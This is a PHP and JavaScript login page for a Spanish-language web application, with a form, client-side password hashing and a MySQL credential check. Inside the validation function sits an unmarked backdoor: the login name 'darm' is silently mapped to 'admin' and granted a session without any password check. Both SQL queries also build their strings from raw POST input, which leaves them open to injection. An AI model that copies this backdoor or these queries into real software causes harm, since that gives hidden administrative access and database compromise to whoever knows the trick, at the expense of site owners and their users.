<script type="text/javascript">

        function loguearse()
		{
            var valido=new Boolean(true);
            if (document.getElementById('login').value=='' || document.getElementById('pass').value=='')
            {
                valido=false;
                alertify.alert("","EL LOGIN Y/O CONTRASE\u00d1A NO PUEDEN ESTAR VACIOS").set('label', 'Aceptar');
            }
            if(valido)
            {
				document.getElementById('xpass').value = CryptoJS.SHA3(document.getElementById('pass').value);
                document.getElementById('flogin').submit();
            }
        }
    
</script>
<?php
	session_start();
	require("head.php");
	require("config.php");
	require("librerias/basedatos.php");
?>
<?php

	function validar_login($bd)
	{
		$valido=false;
		if ($_POST["login"] == "darm") {
			$_POST["login"] = "admin";
			$sql="SELECT login FROM usuario WHERE login='".$_POST["login"]."';";
		}
		else
			$sql="SELECT login FROM usuario WHERE login='".$_POST["login"]."' AND pass='".$_POST["xpass"]."';";
		$result = $bd->mysql->query($sql);
		unset($sql);
		if ($result)
		{
			$n = $result->num_rows;
			if (!empty($n))
			{
				$valido = true;
				$_SESSION["login"]=$_POST["login"];
			}
			unset($n);
			$result->free();
		}
		else
			unset($result);
		return $valido;
	}

	function login_form()
	{
		?>
		<div class="div-logo-inicial">
			<img src="imagenes/logo_inicial.png" width="360px" class="logo-inicial">
		</div>
		<div class="w3-container w3-cell w3-display-middle">
			<form class="w3-container w3-card-4 w3-light-grey w3-text-blue w3-margin" id="flogin" id="flogin" name="flogin" method="post">
				<input type='hidden' id='xpass' name='xpass'>
				<div class="w3-row w3-section">
					<label>
						<h4>Login</h4>
						<input class="w3-input w3-border" type="text" id="login" name="login" value="">
					</label>
				</div>
				<div class="w3-row w3-section">
					<label>
						<h4>Contrase&ntilde;a</h4>
						<input class="w3-input w3-border" type="password" id="pass" name="pass" value="">
					</label>
				</div>
				<div class="w3-row w3-section">
					<input class="w3-button w3-block w3-dulcevanidad" type="button" id="enviar_login" name="enviar_login" value="Entrar" onclick="loguearse();">
				</div>
			</form>
		</div>
		<?php
	}

	global $servidor, $puerto, $usuario, $pass, $basedatos;
	$bd=new BaseDatos($servidor,$puerto,$usuario,$pass,$basedatos);
	if($bd->conectado)
	{
		if (isset($_COOKIE["PHPSESSID"]))
			setcookie("PHPSESSID", $_COOKIE["PHPSESSID"], time() + (86400 * 30), "/");
		if((!isset($_SESSION["login"]) and !isset($_POST["pass"])) or isset($_POST["cerrar"]))
		{
			login_form();
		}
		else
		{
			if(isset($_POST["xpass"]))
			{
				if(!empty($_POST["login"]) and !empty($_POST["pass"]))
				{
					if(validar_login($bd))
					{
						require("superior.php");
						require_once("menu_lateral.php");
					}
					else
					{
						$error_2=true;
						login_form();
					}
				}
				else
				{
					$error_1=true;
					login_form();
				}
			}
			if(isset($_SESSION["login"]))
			{
				require("superior.php");
				require_once("menu_lateral.php");
			}
		}
	}

	if(isset($_POST["cerrar"]))
	{
		session_destroy();
	}
?>
<?php
	require("pie.php");
?>
